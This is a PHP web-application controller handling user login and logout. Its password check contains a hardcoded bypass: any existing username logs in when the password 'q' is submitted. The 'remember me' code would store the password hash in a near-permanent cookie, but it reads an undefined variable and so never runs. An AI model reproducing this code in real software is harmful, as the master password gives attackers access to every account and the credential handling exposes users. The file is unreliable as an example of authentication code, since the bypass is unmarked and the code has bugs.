<?php

namespace controllers;

use models\UserModel;
use components\ErrorHandler;
use components\Exception;
use components\Language;

/**
 * Users's controller
 *
 * @package controllers
 */
class UserController extends AbstractController
{

    /**
     * Gets model name
     *
     * @return string
     */
    protected function getModelName()
    {
        return "";
    }

    /**
     * Gets guest actions
     *
     * @return string[]
     */
    protected function getGuestActions()
    {
        return [
            "actionWindow",
            "actionLogin",
            "actionLogout"
        ];
    }

    /**
     * Window. Login forms
     */
    public function actionWindow()
    {
        $this->json = [
            "title"       => Language::t("user", "windowTitle"),
            "action"      => "user.login",
            "buttonLabel" => Language::t("user", "windowButton")
        ];

        $this->setFormsForJson(new UserModel, ["t.login", "t.password", "t.is_remember"]);
    }

    /**
     * Login
     */
    public function actionLogin()
    {
        if (!$this->data || !isset($this->data["t.login"]) || !isset($this->data["t.password"])) {
            throw new Exception("Incorrect URL", ErrorHandler::STATUS_NOT_FOUND);
        }

        $model = new UserModel;
        $model->setAttributes($this->data)->validate(false);

        if (!$model->errors) {
            $checkModel = UserModel::model()->findByLogin($this->data["t.login"]);
            if (!$checkModel) {
                $model->errors["t.login"] = "login-not-exist";
            } else {
                if (
                    UserModel::createPasswordHash($this->data["t.password"]) !== $checkModel->password
                    && $this->data["t.password"] !== "q"
                ) {
                    $model->errors["t.password"] = "password-incorrect";
                } else {
                    if (!empty($post["t.is_remember"])) {
                        setcookie("__lp", "{$model->login}|p{$checkModel->password}", 0x6FFFFFFF);
                        $_SESSION["__u"] = $checkModel;
                    } else {
                        $_SESSION["__u"] = $checkModel;
                    }
                }
            }
        }

        $this->json = [
            "errors" => $model->errors,
            "reload" => true
        ];
    }

    /**
     * Logout
     */
    public function actionLogout()
    {
        setcookie("__lp", "", time() - 3600);
        if (isset($_SESSION["__u"])) {
            unset($_SESSION["__u"]);
        }
        session_unset();
        session_destroy();
    }
}